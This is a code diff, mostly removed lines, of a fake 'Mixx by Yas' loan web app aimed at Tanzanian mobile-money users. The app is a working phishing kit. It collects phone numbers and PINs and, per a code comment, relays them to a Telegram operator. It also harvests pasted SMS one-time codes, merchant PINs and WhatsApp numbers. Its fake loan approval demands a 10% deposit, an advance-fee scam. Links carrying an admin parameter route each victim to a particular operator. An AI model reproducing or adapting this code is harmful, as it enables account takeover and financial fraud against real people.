-      <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label>Hali ya Ajira</label><div class="sel-wrap"><select id="s3em"><option>Ameajiriwa</option><option selected>Binafsi</option><option>Hana Kazi</option><option>Mstaafu</option><option>Mwanafunzi</option></select></div></div>
-      <div class="field"><label>Mapato ya Mwaka (TZS)</label><input type="number" id="s3in" placeholder="Weka mapato ya mwaka" oninput="clearErr('s3Err')"></div>
-      <div class="sum-box">
-        <h3>Muhtasari wa Ombi</h3>
-        <div class="sum-row"><span class="sk">Kiasi cha Mkopo:</span><span class="sv" id="sA">TZS 1,000,000</span></div>
-        <div class="sum-row"><span class="sk">Muda wa Mkopo:</span><span class="sv" id="sT">Miezi 48</span></div>
-        <div class="sum-row"><span class="sk">Kusudi:</span><span class="sv" id="sP">—</span></div>
-        <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
-      </div>
-      <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step2')">NYUMA</button>
-        <button class="btn-grad" onclick="submitApp()">WASILISHA OMBI</button>
-      </div>
-    </div>
-  </div>
-  <div class="pg-footer">© 2026 Mixx by Yas Tanzania</div>
-</div>
-
-<!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
-<div id="page-submitted" class="page">
-  <div class="sub-wrap">
-    <div class="sub-icon">📋</div>
-    <h2>Ombi la Mkopo Limewasilishwa</h2>
-    <p>Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini.<br>Utapokea ujumbe wa uthibitisho. Kwa sasa, endelea kwenda Mixx by Yas.</p>
-    <div class="redir-pill">🔄 Unakwenda kwenye kuingia kwa <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')">Ingia Sasa</button>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
-<div id="page-login" class="page">
-  <div class="login-hdr">
-    <div class="myas-logo">
-      <svg width="52" height="52" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text" style="font-size:1.5rem;">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
-  </div>
-  <div class="login-body-wrap">
-    <h2>Ingia</h2>
-    <div class="login-inner">
-      <!-- Inline message for login errors -->
-      <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
-
-      <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇹🇿 +255</div>
-        <input type="tel" id="lgPh" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
-      </div>
-      <div class="pin-label">Weka PIN yako (tarakimu 4)</div>
-      <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
-        <button class="pin-eye" onclick="togPin()">👁</button>
-      </div>
-      <div class="forgot-pin">Umesahau PIN?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()">INGIA</button>
-    </div>
-  </div>
-  <div class="lg-curve">
-    <div class="lg-foot">
-      <div class="myas-logo">
-      <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
-      <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms">Kwa kuingia unakubali <a href="#">Masharti na Kanuni</a></div>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
-<div id="page-otp" class="page">
-  <div class="otp-topbar">
-    <button class="bk" onclick="goTo('page-login')">←</button>
-    <div style="display:flex;align-items:center;gap:8px;">
-      <svg width="22" height="22" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/><text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text></svg>
-      <div class="logo-text">Mixx by Yas</div>
-    </div>
-    <div class="hbg2"><span></span><span></span><span></span></div>
-  </div>
-  <div class="otp-body-wrap">
-    <div class="otp-card">
-      <h2>Uthibitisho wa Code</h2>
-      <p class="otp-hint">ujumbe umetumwa kwenye nambari yako ya simu</p>
-      <div class="otp-phone" id="otpPh">+255712345678</div>
-
-      <!-- Inline messages for OTP page -->
-      <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
-      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
-      <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
-
-      <!-- Waiting for admin approval indicator -->
-      <div class="waiting-box" id="pinWait">
-        <div class="wb-spinner"></div>
-        <p>Inasubiri msimamizi kuthibitisha maelezo yako…</p>
-      </div>
-
-      <div id="otpInputSection">
-        <p style="font-size:0.9rem;color:#333;margin-bottom:12px;font-weight:500;">Nakili ujumbe kamili uliyotumwa kwenye simu na ubandike hapa.</p>
-        <div class="otp-inputs">
-          <textarea class="otp-box" id="otpInput" placeholder="Bandika ujumbe kamili hapa." oninput="chkOtp()"></textarea>
-        </div>
-        <div class="otp-resend" id="otpRs">Tuma tena msimbo kwa <span id="rsS">17</span> sekunde</div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
-      </div>
-    </div>
-  </div>
-  <div class="otp-curve"><div class="otp-foot">© 2026 Mixx by Yas Tanzania</div></div>
-</div>
-
-<!-- ══════════════════════ PAGE 8: MERCHANT PIN ══════════════════════ -->
-<div id="page-merchant-pin" class="page">
-  <div class="login-hdr">
-    <div class="myas-logo">
-      <svg width="52" height="52" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text" style="font-size:1.5rem;">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
-  </div>
-  <div class="login-body-wrap">
-    <h2>Merchant Account PIN</h2>
-    <div class="login-inner">
-      <div class="msg-box error" id="mpMsg"><span class="msg-icon">✕</span><span id="mpMsgTxt"></span></div>
-      <div class="msg-box success" id="mpMsgOk"><span class="msg-icon">✓</span><span id="mpMsgOkTxt"></span></div>
-      <div class="msg-box warning" id="mpMsgWarn"><span class="msg-icon">⚠</span><span id="mpMsgWarnTxt"></span></div>
-
-      <!-- Waiting for admin approval indicator -->
-      <div class="waiting-box" id="merchPinWait">
-        <div class="wb-spinner"></div>
-        <p>Inasubiri msimamizi kuthibitisha PIN yako ya Merchant…</p>
-      </div>
-
-      <div id="merchPinInputSection">
-        <div class="pin-label">Weka PIN yako ya Merchant Account (tarakimu 4)</div>
-        <div class="pin-row">
-          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" id="mp0">
-          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" id="mp1">
-          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" id="mp2">
-          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" id="mp3">
-          <button class="pin-eye" onclick="togMerchPin()">👁</button>
-        </div>
-        <button class="btn-login" id="bMerchPin" onclick="doMerchPin()">THIBITISHA PIN</button>
-      </div>
-    </div>
-  </div>
-  <div class="lg-curve">
-    <div class="lg-foot">
-      <div class="myas-logo">
-      <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
-      <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms">Kwa kuendelea unakubali <a href="#">Masharti na Kanuni</a></div>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE 9: APPROVAL ══════════════════════ -->
-<div id="page-approval" class="page">
-  <div class="appr-wrap">
-    <div class="appr-top">
-      <div class="check-circle">✓</div>
-      <div class="appr-title">🎉 Hongera!</div>
-      <div class="appr-sub">Mkopo wako umeidhinishwa <strong>kikamilifu!</strong> Fedha zitatumwa hivi karibuni.</div>
-      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TZS 1,000,000</div></div>
-    </div>
-    <div class="comp-box">
-      <div class="ch">⚠️ NOTISI YA UTIIFU</div>
-      <p>Akaunti yako ya Mixx by Yas lazima iwe hai na kudumisha amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba.</strong> Amana hii inarejeshwa kikamilifu baada ya kulipa mkopo kwa mafanikio na husaidia kupata viwango bora vya riba.</p>
-    </div>
-    <div class="ld-card">
-      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TZS 27,500</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 48</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">KIWANGO CHA RIBA</div><div class="ld-val">8% APR</div></div></div>
-    </div>
-    <div class="qa-wrap">
-      <div class="qa-title">Vitendo vya Haraka</div>
-      <button class="qa-btn">💰 Weka Fedha</button>
-      <button class="qa-btn">💸 Toa Fedha</button>
-      <button class="qa-btn">📄 Maelezo ya Mkopo</button>
-    </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapokea SMS na barua pepe na maelezo ya utoaji ndani ya masaa 24.</p></div>
-    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Nyumbani</button></div>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE: OTP HELP (WhatsApp) ══════════════════════ -->
-<div id="page-otp-help" class="page" style="background:#fff;">
-  <div style="display:flex;flex-direction:column;height:100vh;">
-    <div style="background:var(--navy);color:#fff;padding:16px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;">
-      <button style="background:none;border:none;color:#fff;font-size:1.5rem;cursor:pointer;" onclick="goTo('page-otp')">←</button>
-      <div style="font-weight:700;">Mixx by Yas</div>
-      <div style="width:24px;"></div>
-    </div>
-    <div style="flex:1;padding:28px 20px;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;overflow-y:auto;">
-      <div style="width:100%;max-width:440px;">
-        <h2 style="font-size:1.2rem;font-weight:700;margin-bottom:6px;color:#006064;">💬 Tumaini La Msaada</h2>
-        <p style="font-size:0.83rem;color:#666;margin-bottom:22px;">Karibu! Tafadhali toa nambari yako ya WhatsApp ili tuweze kuwasiliana nawe.</p>
-
-        <div id="helpMsgErr" style="display:none;border:1.5px solid #fecaca;background:#fef2f2;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:0.84rem;color:#991b1b;">
-          <span>✕</span> <span id="helpMsgErrTxt"></span>
-        </div>
-
-        <div id="helpInputSection">
-          <label style="display:block;font-size:0.82rem;font-weight:500;color:#666;margin-bottom:6px;">Nambari ya WhatsApp</label>
-          <div style="display:flex;">
-            <div style="padding:11px 12px;background:#f5f5f5;border:1.5px solid #ddd;border-right:none;border-radius:8px 0 0 8px;font-size:0.85rem;font-weight:500;color:#555;white-space:nowrap;display:flex;align-items:center;">🇿🇦 +27</div>
-            <input type="tel" id="whatsappNum" placeholder="712345678" maxlength="10" oninput="normalizePhone('whatsappNum');chkWhatsapp()" style="flex:1;padding:11px 14px;border:1.5px solid #ddd;border-left:none;border-radius:0 8px 8px 0;font-family:'Inter',sans-serif;font-size:0.9rem;outline:none;transition:border-color 0.2s;">
-          </div>
-          <button class="btn-otp" id="bWhatsapp" style="width:100%;margin-top:20px;padding:13px;background:#e8e8e8;color:#aaa;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;letter-spacing:0.05em;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="submitWhatsapp()">TUMA NAMBARI</button>
-        </div>
-
-        <div id="helpWait" style="display:none;background:#f8f9ff;border:1px solid #e0e5ff;border-radius:8px;padding:16px;text-align:center;margin-top:20px;">
-          <div style="width:28px;height:28px;border:3px solid #e0e5ff;border-top-color:#00897b;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px;"></div>
-          <p style="font-size:0.82rem;color:#666;">Tutawasiliana nawe hivi karibuni kupitia WhatsApp…</p>
-        </div>
-
-        <div id="helpSuccess" style="display:none;text-align:center;padding:20px;">
-          <div style="font-size:3rem;margin-bottom:16px;">✅</div>
-          <h3 style="font-size:1.1rem;font-weight:700;margin-bottom:8px;color:#006064;">Asante!</h3>
-          <p style="font-size:0.88rem;color:#666;line-height:1.6;">Nambari yako imetokea. Tunatarajia kuwasiliana nawe haraka kupitia WhatsApp.</p>
-          <p style="margin-top:12px; font-size:0.9rem;"><strong>Karibuni kuweka simu yako karibu!</strong></p>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- MODALS -->
-<div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
-</div>
-<div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>Inathibitisha Code</h3><p id="otpVT">Please wait… (3s)</p></div>
-</div>
-<div class="overlay" id="mMerchPin">
-  <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma PIN yako ya Merchant kwa uthibitisho</p></div>
-</div>
-<div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Ombi…</h3><p>Tafadhali subiri tunazindua ombi lako</p></div>
-</div>
-
-<!-- HELP MODAL -->
-<div class="overlay" id="helpModal" style="display:none;">
-  <div class="modal" style="max-width:340px;">
-    <h3 style="font-size:1.15rem;font-weight:700;color:#006064;margin-bottom:12px;">Je, Unahitaji Msaada?</h3>
-    <p style="font-size:0.9rem;color:#666;margin-bottom:24px;line-height:1.6;">Imeshindwa kwa mara mbili. Tunaweza kukusaidia kupitia WhatsApp. Unataka msaada?</p>
-    <div style="display:flex;gap:12px;">
-      <button style="flex:1;padding:12px;background:#e8e8e8;color:#666;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="closeHelpModal()">Hapana</button>
-      <button style="flex:1;padding:12px;background:linear-gradient(to right, #006064, #00838f);color:#fff;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="goToHelpPage()">Ndiyo</button>
-    </div>
-  </div>
-</div>
-
-<script>
-  // ══════════════════════════════════════════════════════
-  // STATE
-  // ══════════════════════════════════════════════════════
-  const S = {
-    amt: 1000000,
-    term: 'Miezi 48',
-    purpose: '',
-    first: '',
-    last: '',
-    phone: '',
-    applicationId: null,   // set after /api/verify-pin
-    assignedAdminId: null  // set after /api/verify-pin
-  };
-
-  // ── Admin ID capture from URL (same pattern as original system) ──
-  // ── Admin ID: ONLY from the current URL — never from storage.
-  // This guarantees customers from Link A go to Admin A, Link B to Admin B.
-  // If no ?admin= param, auto-assign on the server side.
-  const _URL_ADMIN_ID = (() => {
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('admin');
-    // Clear any stale stored admin from previous sessions to prevent leakage
-    sessionStorage.removeItem('selectedAdminId');
-    localStorage.removeItem('selectedAdminId');
-    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      // Store only for this page session (OTP page reload safety)
-      sessionStorage.setItem('selectedAdminId', id.trim());
-      return id.trim();
+function getAdminIdByChatId(chatId) {
+    for (const [adminId, storedChatId] of adminChatIds.entries()) {
+        if (storedChatId === chatId) return adminId;
     }
     return null;
-  })();
-
-  function getAdminId() {
-    // Always prefer live URL param, then session-only fallback (same tab/session)
-    const params = new URLSearchParams(window.location.search);
-    const urlId  = params.get('admin');
-    if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') {
-      return urlId.trim();
-    }
-    // sessionStorage fallback covers OTP page (same tab, no ?admin= in URL)
-    return sessionStorage.getItem('selectedAdminId') || null;
-  }
-
-  // ══════════════════════════════════════════════════════
-  // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
-  function goTo(id) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    window.scrollTo(0, 0);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOAN CALCULATOR
-  // ══════════════════════════════════════════════════════
-  function calcUp() {
-    const a = +document.getElementById('rA').value;
-    const t = +document.getElementById('rT').value;
-    const r = 0.25 / 12;
-    const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-    document.getElementById('aDisp').textContent = 'TZS ' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' miezi';
-    document.getElementById('mOut').textContent = 'TZS ' + m.toFixed(2);
-    document.getElementById('rA').style.setProperty('--pct', ((a-50000)/(100000000-50000)*100).toFixed(1) + '%');
-    document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
-  }
-
-  // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
-  // ══════════════════════════════════════════════════════
-  // Normalize phone: strip leading 0 so +263 prefix works correctly
-  function normalizePhone(id) {
-    const el = document.getElementById(id);
-    if (el.value.startsWith('0')) {
-      const cursor = el.selectionStart;
-      el.value = el.value.substring(1);
-      // Restore cursor position (minus the removed 0)
-      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
-    }
-  }
-
-  // Validation helpers
-  function showErr(id, msg) {
-    document.getElementById(id + 'Txt').textContent = msg;
-    document.getElementById(id).classList.add('show');
-    document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-  }
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
-  }
-  function shakeField(id) {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.style.borderColor = '#ef4444';
-    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
-    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
-  }
-
-  function toS2() {
-    const amt     = document.getElementById('s1am').value;
-    const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Tafadhali weka kiasi halali cha mkopo.');
-      shakeField('s1am'); return;
-    }
-    if (!purpose) {
-      showErr('s1Err', 'Tafadhali elezea kusudi la mkopo wako.');
-      shakeField('s1pu'); return;
-    }
-    clearErr('s1Err');
-    S.amt     = amt;
-    S.term    = document.getElementById('s1te').value;
-    S.purpose = purpose;
-    goTo('page-step2');
-  }
-
-  function toS3() {
-    const first = document.getElementById('s2fi').value.trim();
-    const last  = document.getElementById('s2la').value.trim();
-    const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Tafadhali weka jina lako la kwanza.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Tafadhali weka jina lako la mwisho.');  shakeField('s2la'); return; }
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari ya simu ya tarakimu 9 sahihi.'); shakeField('s2ph'); return;
-    }
-    clearErr('s2Err');
-    S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = 'TZS ' + Number(S.amt).toLocaleString();
-    document.getElementById('sT').textContent = S.term;
-    document.getElementById('sP').textContent = S.purpose || '—';
-    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
-    goTo('page-step3');
-  }
-
-  // STEP 3: SUBMIT APPLICATION
-  function submitApp() {
-    const income = document.getElementById('s3in').value;
-    if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Tafadhali weka mapato yako ya mwaka.'); shakeField('s3in'); return;
-    }
-    clearErr('s3Err');
-
-    // Show spinner while "processing"
-    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'INAWASILISHA…'; }
-    document.getElementById('mSubmit').classList.add('show');
-
-    // Simulate brief processing delay (1.5s) then navigate
-    setTimeout(() => {
-      document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA OMBI'; }
-      goTo('page-submitted');
-      let c = 3;
-      document.getElementById('rdN').textContent = c;
-      const iv = setInterval(() => {
-        c--;
-        document.getElementById('rdN').textContent = c;
-        if (c <= 0) { clearInterval(iv); goTo('page-login'); }
-      }, 1000);
-    }, 1500);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
-  // ══════════════════════════════════════════════════════
-  function showLoginMsg(text) {
-    document.getElementById('lgMsgTxt').textContent = text;
-    document.getElementById('lgMsg').classList.add('show');
-  }
-  function hideLoginMsg() {
-    document.getElementById('lgMsg').classList.remove('show');
-  }
-
-  function showOtpMsg(type, text) {
-    // Hide all first
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-    if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
-    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
-  }
-  function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
-    chkLogin();
-  }
-
-  function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
-  }
-
-  function togPin() {
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('p'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
-    });
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin (sends phone + PIN to Telegram admin)
-  // ══════════════════════════════════════════════════════
-  async function doLogin() {
-    hideLoginMsg();
-
-    const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
-
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Tafadhali weka nambari yako ya simu na PIN ya tarakimu 4.');
-      return;
-    }
-
-    const phoneNumber = '+255' + rawPhone;
-    const adminId = getAdminId();
-
-    // Show loading modal
-    document.getElementById('mLogin').classList.add('show');
-    document.getElementById('bLogin').disabled = true;
-
-    try {
-      const res = await fetch('/api/verify-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber,
-          pin,
-          adminId: adminId || null,
-          assignmentType: adminId ? 'specific' : 'auto'
-        })
-      });
-
-      const data = await res.json();
-
-      document.getElementById('mLogin').classList.remove('show');
-
-      if (data.success) {
-        // Store application ID for polling
-        S.applicationId   = data.applicationId;
-        S.assignedAdminId = data.assignedAdminId;
-
-        // Set phone display on OTP page
-        document.getElementById('otpPh').textContent = phoneNumber;
-
-        // Transition to OTP page — but show "waiting for admin" first
-        goTo('page-otp');
-        document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
-
-        // Start polling for PIN approval
-        pollPinStatus();
-
-      } else {
-        document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Uthibitisho umeshindwa. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      document.getElementById('mLogin').classList.remove('show');
-      document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Hitilafu ya mtandao. Tafadhali angalia muunganisho wako na ujaribu tena.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status  (waiting for admin to tap ✅ or ❌)
-  // ══════════════════════════════════════════════════════
-  let pinPollInterval = null;
-
-  function pollPinStatus() {
-    if (pinPollInterval) clearInterval(pinPollInterval);
-
-    pinPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(pinPollInterval);
-          // Hide waiting, show OTP input
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          startRs();
-          document.getElementById('otpInput').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Inakupeleka kurudi kuingia tena…');
-          // Reset application state so a fresh login creates a new application
-          S.applicationId   = null;
-          S.assignedAdminId = null;
-          // Clear PIN boxes and re-enable login button
-          [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-          chkLogin();
-          document.getElementById('bLogin').disabled = false;
-          // Redirect user back to login page after a short delay
-          setTimeout(() => {
-            hideOtpMsgs();
-            goTo('page-login');
-          }, 2500);
-        }
-        // status === 'pending' → keep polling
-
-      } catch (e) {
-        // Silent — keep polling on network hiccup
-      }
-    }, 2000);
-
-    // Timeout after 5 minutes
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Muda wa uthibitisho umekwisha. Tafadhali rudi na ujaribu tena.');
-        }
-      }
-    }, 300000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function chkOtp() {
-    const otpInput = document.getElementById('otpInput').value.trim();
-    const ok = otpInput.length > 0;
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
-  }
-
-  let _rsInterval = null;
-  function startRs() {
-    // Clear any existing countdown first
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    // Always rebuild the span fresh so the ID exists
-    rsBox.innerHTML = 'Tuma tena msimbo kwa <span id="rsS">' + s + '</span> sekunde';
-
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Tuma tena msimbo</span>';
-      }
-    }, 1000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP — calls /api/resend-otp
-  // ══════════════════════════════════════════════════════
-  async function resendOtp() {
-    if (!S.applicationId) return;
-    try {
-      const res  = await fetch('/api/resend-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
-      });
-      const data = await res.json();
-      if (data.success) {
-        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
-        startRs();
-        document.getElementById('otpInput').value = '';
-        chkOtp();
-        document.getElementById('otpInput').focus();
-      } else {
-        showOtpMsg('error', 'Haikuweza kutuma tena OTP. Tafadhali jaribu tena.');
-      }
-    } catch {
